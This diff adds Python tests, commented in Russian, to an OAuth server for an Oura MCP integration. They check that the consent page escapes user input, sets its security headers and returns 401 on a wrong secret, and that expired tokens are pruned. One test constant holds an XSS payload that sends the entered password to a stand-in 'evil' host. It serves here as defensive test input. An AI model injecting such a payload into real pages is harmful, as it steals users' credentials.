@@ -17,7 +17,12 @@ from pydantic import AnyUrl
 
 from mcp.server.auth.provider import AuthorizationParams
 from mcp.shared.auth import OAuthClientInformationFull
-from my_oura_mcp.oauth_server import AdvertisePublicClients, OAuthStore, OuraAuthProvider
+from my_oura_mcp.oauth_server import (
+    AdvertisePublicClients,
+    OAuthStore,
+    OuraAuthProvider,
+    _consent_page,
+)
 
 SECRET = "o" * 32
 REDIRECT = "https://claude.ai/api/mcp/auth_callback"
@@ -384,3 +389,109 @@ async def test_error_response_is_not_patched():
     status, _, body = await _call(app)
     assert status == 500
     assert json.loads(body) == {"error": "boom"}
+
+
+# --- страница согласия ------------------------------------------------------
+#
+# Страница отдаёт форму, куда владелец вводит секрет, — то есть худшее место
+# для внедрения в этом проекте. Идентификатор заявки приходит из query, значит
+# управляется тем, кто прислал ссылку.
+
+XSS = '"><script>fetch("//evil/"+document.forms[0].password.value)</script><x y="'
+
+
+def test_request_id_is_escaped():
+    """Иначе ссылка `?request="><script>…` крала бы вводимый секрет."""
+    body = _consent_page(XSS).body.decode()
+    assert "<script>fetch" not in body
+    assert "&lt;script&gt;" in body
+
+
+def test_escaping_survives_the_error_page():
+    """Второй путь отрисовки — та же подстановка, тот же риск."""
+    body = _consent_page(XSS, error=True).body.decode()
+    assert "<script>fetch" not in body
+
+
+def test_legitimate_request_id_round_trips():
+    """Экранирование не должно ломать нормальный идентификатор."""
+    body = _consent_page("abc-123_XYZ").body.decode()
+    assert 'value="abc-123_XYZ"' in body
+
+
+def test_scripts_are_forbidden_by_policy():
+    """Второй заслон после экранирования: своих скриптов на странице нет."""
+    csp = _consent_page("x").headers["content-security-policy"]
+    assert "default-src 'none'" in csp
+
+
+def test_form_cannot_be_redirected_elsewhere():
+    """form-action не даёт увести POST с секретом на чужой хост."""
+    assert "form-action 'self'" in _consent_page("x").headers["content-security-policy"]
+
+
+def test_page_cannot_be_framed():
+    """Clickjacking: прозрачный слой поверх формы ловит ввод."""
+    page = _consent_page("x")
+    assert "frame-ancestors 'none'" in page.headers["content-security-policy"]
+    assert page.headers["x-frame-options"] == "DENY"
+
+
+def test_page_is_not_cached():
+    """В истории и кэше страницы с полем секрета быть не должно."""
+    assert _consent_page("x").headers["cache-control"] == "no-store"
+
+
+def test_request_id_does_not_leak_via_referer():
+    assert _consent_page("x").headers["referrer-policy"] == "no-referrer"
+
+
+def test_wrong_secret_answers_401():
+    assert _consent_page("x", error=True).status_code == 401
+    assert _consent_page("x").status_code == 200
+
+
+# --- уборка хранилища -------------------------------------------------------
+
+
+async def test_refresh_token_has_an_expiry(provider, client, store_path):
+    """Без срока каждое переподключение оставляло бы запись навсегда."""
+    code = await _authorized(provider, client)
+    loaded = await provider.load_authorization_code(client, code)
+    tokens = await provider.exchange_authorization_code(client, loaded)
+
+    row = json.loads(store_path.read_text())["refresh"][tokens.refresh_token]
+    assert row["expires_at"] > time.time()
+
+
+async def test_expired_rows_are_pruned_on_issue(provider, client, store_path):
+    """Уборка приурочена к выдаче — отдельного планировщика для неё нет."""
+    code = await _authorized(provider, client)
+    loaded = await provider.load_authorization_code(client, code)
+    first = await provider.exchange_authorization_code(client, loaded)
+
+    raw = json.loads(store_path.read_text())
+    raw["access"]["stale-access"] = {"token": "stale-access", "client_id": "cid", "scopes": [], "expires_at": 1}
+    raw["refresh"]["stale-refresh"] = {"token": "stale-refresh", "client_id": "cid", "scopes": [], "expires_at": 1}
+    store_path.write_text(json.dumps(raw))
+
+    revived = OuraAuthProvider(OAuthStore(store_path), SECRET)
+    rt = await revived.load_refresh_token(client, first.refresh_token)
+    await revived.exchange_refresh_token(client, rt, [])
+
+    after = json.loads(store_path.read_text())
+    assert "stale-access" not in after["access"]
+    assert "stale-refresh" not in after["refresh"]
+
+
+async def test_prune_keeps_live_rows(provider, client, store_path):
+    """Уборка не должна выносить живое вместе с мёртвым."""
+    code = await _authorized(provider, client)
+    loaded = await provider.load_authorization_code(client, code)
+    first = await provider.exchange_authorization_code(client, loaded)
+
+    rt = await provider.load_refresh_token(client, first.refresh_token)
+    second = await provider.exchange_refresh_token(client, rt, [])
+
+    assert await provider.load_access_token(second.access_token) is not None
+    assert await provider.load_refresh_token(client, second.refresh_token) is not None
